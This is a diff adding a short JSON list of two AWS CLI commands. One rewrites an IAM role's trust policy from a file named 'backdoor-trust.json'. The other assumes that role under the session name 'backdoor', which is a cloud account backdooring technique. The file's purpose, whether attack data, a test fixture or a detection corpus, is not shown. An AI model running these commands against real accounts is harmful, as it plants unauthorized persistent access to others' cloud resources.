@@ -1,0 +1,4 @@
+[
+  "aws iam update-assume-role-policy --role-name TargetRole --policy-document file://backdoor-trust.json",
+  "aws sts assume-role --role-arn arn:aws:iam::TARGET:role/TargetRole --role-session-name backdoor"
+]
